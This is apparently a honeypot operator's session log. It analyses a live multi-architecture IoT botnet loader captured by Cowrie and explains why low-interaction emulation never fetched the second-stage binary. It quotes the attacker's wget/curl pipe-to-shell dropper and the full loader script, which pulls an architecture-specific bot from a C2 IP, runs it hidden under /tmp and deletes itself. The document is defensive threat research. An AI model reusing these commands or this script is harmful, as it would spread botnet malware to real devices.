# SESSION 27 — Live Loader Capture & the Low-Interaction Ceiling

**Date:** 2026-09-09
**Box:** Hetzner Cloud VPS `ubuntu-4gb-hel1-2` (62.238.47.215)
**Continuity:** Follows `SESSION-26-dionaea-disk-full-incident-2026-09-08.md`.
**Trigger:** A real, live multi-architecture IoT botnet loader was captured on Cowrie's
telnet listener. Investigating how far it actually got produced concrete evidence for
a decision that had previously only been discussed in theory: whether low-interaction
Cowrie can ever catch a full multi-stage infection.

---

## 0. The capture

**Source:** `82.25.63.191`, session `08f4e2665fb3`, telnet (port 23), `2026-09-09T05:24:04Z`.

**Stage 1 — the dropper command:**

```bash
wget -qO- http://2.27.248.13/payload.sh | sh || curl -s http://2.27.248.13/payload.sh | sh
```

The classic pipe-to-shell idiom: fetch a script and execute it in one line, no file
ever touches disk under a name the attacker has to clean up. The `||` is a fallback —
try `wget` first, fall back to `curl` if it's unavailable, matching the same
downloader-detection pattern seen inside the script itself (§1).

**Confirmed: this was a real fetch, not a simulated one.** Cowrie's `wget` command
genuinely reaches out over the live network by design — this is intentional, so real
payloads can be captured for analysis. The log shows a `cowrie.session.file_download`
event immediately after:

```text
url: http://2.27.248.13/payload.sh
outfile: var/lib/cowrie/downloads/9f17c19503b321e2f819128e8ec23e4e88fc12fa6a4985a2a4f19f954408a324
shasum: 9f17c19503b321e2f819128e8ec23e4e88fc12fa6a4985a2a4f19f954408a324
```

A genuine, live payload script, SHA-256 `9f17c195...`, pulled from an active C2 and
sitting in the downloads directory.

**Oddity noted, not yet fixed:** the same download fired twice, the second marked
`"duplicate": true`. Real bash's `||` only evaluates the right side if the left side
*fails* — if Cowrie's `wget` succeeded, `curl` should never have run at all. Whether
this is Cowrie executing both sides of the `||` regardless of exit status, or the
attacker's own script/tooling re-sending the command, wasn't determined this session.
Flagged as an open item (§4).

---

## 1. What the script actually does

The fetched `payload.sh` is a full multi-architecture bot loader:

```bash
#!/bin/sh
C2_URL="http://2.27.248.13/bins"
ARCH=$(uname -m)
BOT_FILE=""

case "$ARCH" in
    x86_64|amd64)   BOT_FILE="x86_64" ;;
    i686|i386|...)  BOT_FILE="x86" ;;
    armv7l|...)     BOT_FILE="arm7" ;;
    armv6l|armv6)   BOT_FILE="arm6" ;;
    armv5l|...)     BOT_FILE="arm5" ;;
    aarch64|arm64)  BOT_FILE="arm7" ;;   # <- see note below
    mips|mips64)    BOT_FILE="mips" ;;
    mipsel|...)     BOT_FILE="mpsl" ;;
    powerpc|...)    BOT_FILE="ppc" ;;
    sh4)            BOT_FILE="sh4" ;;
    m68k)           BOT_FILE="m68k" ;;
    sparc|sparc64)  BOT_FILE="spc" ;;
    *) echo "[-] Unknown arch: $ARCH"; exit 1 ;;
esac

BOT_URL="$C2_URL/$BOT_FILE"
BOT_PATH="/tmp/.redkill"

if command -v wget >/dev/null 2>&1; then
    wget -q "$BOT_URL" -O "$BOT_PATH"
elif command -v curl >/dev/null 2>&1; then
    curl -s -o "$BOT_PATH" "$BOT_URL"
elif command -v busybox >/dev/null 2>&1; then
    busybox wget -q "$BOT_URL" -O "$BOT_PATH"
else
    echo "[-] No downloader"; exit 1
fi

[ ! -f "$BOT_PATH" ] || [ ! -s "$BOT_PATH" ] && echo "[-] Download failed" && exit 1

chmod 777 "$BOT_PATH"
nohup "$BOT_PATH" >/dev/null 2>&1 &
rm -f "$0"
```

**Behavior, read in order:**
1. Detect CPU architecture via `uname -m`.
2. Map it to a matching pre-built binary name via the `case` statement — coverage
   spans everything from `x86_64` servers down to `sparc`, `m68k`, and multiple ARM
   generations. This is the standard Mirai-derivative spread: routers, DVRs,
   industrial/embedded gear, not just conventional servers.
3. Download the matching binary from `2.27.248.13/bins/<arch>` to a hidden dotfile,
   `/tmp/.redkill`.
4. `chmod 777` it, execute it detached (`nohup ... &`, survives the attacker
   disconnecting), then **delete the loader script itself** (`rm -f "$0"`) —
   anti-forensic cleanup once the real payload is running.

**Detail worth keeping:** `aarch64`/`arm64` maps to the `arm7` binary, not a genuine
64-bit ARM build. Either a bug in the loader, or a deliberate choice to rely on
32-bit ARM binaries running under a compatibility layer on 64-bit ARM devices.

**IOC check — no public match found.** Neither `.redkill` as a name nor the C2 IP
`2.27.248.13` returned any hits in threat-intelligence search (checked against public
sources; not cross-referenced against a dedicated feed like ThreatFox directly this
session). Two readings: either an unreported/fresh operation, or a private, custom
loader not built from a widely-distributed toolkit. Documented here as an original
observation. `2.27.248.13` is a real, live-as-of-this-session C2 endpoint and a
reasonable candidate for submission to a public IOC feed (e.g. abuse.ch ThreatFox)
once independently confirmed.

---

## 2. Did the second stage actually run? — No. And that's the real finding.

The obvious next question: since the script's own logic includes a second `wget`
call against `2.27.248.13/bins/<arch>` — the actual bot binary, not just the delivery
script — did *that* fetch also fire?

```bash
grep "2.27.248.13/bins" /home/cowrie/cowrie/var/log/cowrie/cowrie.json*
```

**No `cowrie.session.file_download` event exists for any `/bins/` path.** The only
matches are the literal string `"http://2.27.248.13/bins"` appearing inside the
logged *text* of the script (the `C2_URL=` assignment line), not a real fetch event.

**The actual bot binary was never retrieved.**

### Why — the architectural reason, not a bug

Cowrie caught the **outer** command (`wget ... payload.sh | sh`) because that is a
literal, top-level command string Cowrie's `wget.py` module recognizes and genuinely
executes. But once `payload.sh`'s multi-line *contents* were fed back in as the next
input, Cowrie logged it as a single `cowrie.command.input` event and moved on. It did
not:

- Parse the `case`/`esac` branching logic
- Evaluate `$ARCH` against the emulated architecture string
- Determine which `BOT_FILE` value the branch would select
- Execute the embedded `wget "$BOT_URL" -O "$BOT_PATH"` line as a real command

Cowrie does not contain a general-purpose shell interpreter capable of executing
arbitrary shell logic — conditionals, variable expansion, control flow. It
pattern-matches a fixed set of known command names (`wget`, `curl`, `cd`, `ls`, and
so on — the same command dictionary extended throughout session 20). A multi-line
script handed to it as one block of text is logged as *data*, not executed as a
*program*. This is true no matter how well-built the individual command emulations
are — every fix from session 20 (`ip`, `nano`, `ls` columns, `cd -`) operates at
exactly this same layer, and none of them close this gap, because it isn't a gap in
any single command. It's the ceiling of the low-interaction approach itself.

> **LESSON — a captured script is not the same as an executed script.** Every command
> in this loader was logged in full, readable detail. None of its actual logic ran.
> The distinction between "Cowrie saw this text" and "Cowrie did this thing" is easy
> to blur when the log output looks this complete — worth checking explicitly
> (as done here, via the absent `/bins` download event) rather than assumed from how
> thorough the capture looks.

---

## 3. What this concretely demonstrates about the deferred high-interaction decision

High-interaction Cowrie (a real container backend instead of the emulated shell) was
scoped and deliberately deferred as far back as the original T-Pot evaluation —
until now, the justification for eventually building it was theoretical ("more
realistic, catches more"). This session produced a specific, real, dated example of
exactly what low-interaction structurally cannot do:

A real container backend would have genuinely executed `payload.sh`. `uname -m`
would return the container's real architecture. The `case` statement would branch
for real. The embedded `wget` would fire against `2.27.248.13/bins/<arch>` and pull
the actual bot binary — a second, likely more valuable sample than the loader script
already captured. Low-interaction Cowrie stopped at the loader by construction, not
by any missing feature or configuration error.

This is the concrete evidence line for prioritizing high-interaction work once the
VPS resize question (§5) is resolved — not "T-Pot claimed this would be better," but
"this specific dated capture on this box could not proceed past stage one, and here
is exactly why."

---

## 4. Open items

- **Duplicate download investigation.** The `payload.sh` fetch fired twice with
  identical output, the second flagged `duplicate: true`. Determine whether Cowrie's
  `||` handling runs both branches regardless of the first command's exit status —
  if so, that's a real shell-semantics bug in the same family as the fixes in
  session 20, worth a source patch.
- **IOC submission.** `2.27.248.13` and the loader's SHA-256 hash are candidates for
  submission to a public feed (e.g. abuse.ch ThreatFox) once independently
  cross-checked — not done this session.
- **`payload.sh` static analysis.** The script itself has not been disassembled/
  deeply analyzed beyond reading its logic — `strings`/`file` triage on the captured
  script file itself (safe; it's a shell script, not a binary) could confirm nothing
  else of interest is embedded (e.g. a base64-encoded secondary payload).

---

## 5. VPS sizing — what upsizing actually buys, and what it doesn't

Asked directly: is resizing to the $41.99/mo CPX32 tier (4 vCPU / 8 GB — the option
confirmed available back in the original resize investigation) sufficient on its own
to stand up the real high-interaction backend?

**No — necessary, not sufficient.** The resize solves exactly one part of the
build: headroom. It does not configure Cowrie to use a container backend at all.
The full scope, most of it unstarted:

| Step | Status |
|---|---|
| VPS resize (RAM/CPU headroom for a container pool) | Not done — the open decision |
| Docker installed | **Already done** — installed for Dionaea in session 22, reusable here |
| Cowrie `backend_pool` configuration (`cowrie.cfg`) — tell Cowrie to hand sessions to real containers instead of the emulator | Not started |
| A hardened decoy container image — minimal, no real secrets, no host mounts, ephemeral | Not built |
| Per-container resource caps (memory/CPU/process count) — prevents one attacker session from starving the host or the other honeypot services | Not configured |
| Container network isolation — attacker containers can reach the internet out, but have zero path back to the Cowrie host, Dionaea, or the homelab | Not configured |
| Testing with an operator's own session before real traffic reaches it | Not done |

This is the same seven-step plan scoped back near the very start of this thread
(before the shell-realism work took priority) — resizing the VPS is step one of
seven, not the whole plan. Docker being already installed for Dionaea is a genuine
head start, but the backend_pool configuration, the hardened image, the resource
caps, and the network isolation are all separate, unstarted work — and the isolation
piece specifically is a real security control, not optional hardening, since a
high-interaction container is where an actual container-escape risk (however small)
first enters this lab's threat model.
